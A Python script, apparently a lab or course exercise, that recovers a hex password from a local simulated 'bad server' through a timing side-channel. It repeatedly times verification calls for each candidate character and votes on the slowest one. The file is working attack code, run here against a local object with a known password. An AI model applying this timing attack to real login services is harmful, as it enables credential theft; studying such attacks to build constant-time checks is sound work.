import bad_server
import api
import secrets
from typing import Optional
import time
from itertools import product
from functools import reduce

class Client:
    def __init__(self, remote: bad_server.BadServer):
        self._remote = remote

    def measure_time(self, password: str, outer_iters = 5, inner_iters=5000, is_last_char=False) -> float:
        if is_last_char:
            req = api.VerifyRequest(password)
        else:
            req = api.VerifyRequest(password+"xx")
            
        times = []
        # warmup
        for _ in range(10):
            self._remote.verify_password(req)
        for _ in range(outer_iters):
            start_time = time.time()
            for _ in range(inner_iters):
                self._remote.verify_password(req)
            end_time = time.time()
            times.append(end_time - start_time)
        times.sort()
        median = times[outer_iters//2]
        return median

    def get_next_char(self, loc: int, l: int, cur_password: str) -> str:
        hex_chars = "0123456789abcdef"
        measured_times = dict.fromkeys(hex_chars, 0)

        is_last_char = (loc==2*l-1)
        outer_iters = 1
        inner_iters = 100
       
        if loc <= 70:
            sample_num = 40
        else:
            sample_num = 80

        while True:
            winner_counts = dict.fromkeys(hex_chars, 0)
            for _ in range(sample_num):
                for ch in hex_chars:
                    test_password = cur_password + ch
                    test_time = self.measure_time(test_password, outer_iters=outer_iters, inner_iters=inner_iters, is_last_char=is_last_char)
                    t = test_time
                    measured_times[ch] = t
                
                next_char = max(measured_times, key=measured_times.get)
                winner_counts[next_char] += 1
            sorted_items = sorted(winner_counts.items(), key=lambda x: x[1], reverse=True)
            if sorted_items[0][1] >= 2 * sorted_items[1][1]:
                break

        winner = sorted_items[0][0]
        return winner, measured_times, sorted_items

    def steal_password(self, l: int) -> str:
        stolen_password = ''
        for i in range(l * 2):  # Two hex chars for each byte
            next_char, measured_times, candidates = self.get_next_char(i, l, stolen_password)
            stolen_password += next_char
            print(f"true {i}: {passwd[i]}, measured: {measured_times[passwd[i]]}")
            print(f"candi 0: {candidates[0][0]}, counts: {candidates[0][1]}")
            print(f"candi 1: {candidates[1][0]}, counts: {candidates[1][1]}")
            print(f"candi 2: {candidates[2][0]}, counts: {candidates[2][1]}")
            print()

        return stolen_password

if __name__ == "__main__":
    passwd = 'f65bdbeea82bf1ec25d90f9848612819f65bdbeea82bf1ec25d90f9848612819f65bdbeea82bf1ec25d90f9848612819f65bdbeea82bf1ec25d90f9848612819'
    nbytes = len(passwd) // 2
    server = bad_server.BadServer(passwd)
    alice = Client(server)
    stole = alice.steal_password(nbytes)
    print("passwd: ", passwd)
    print("stolen: ", stole)
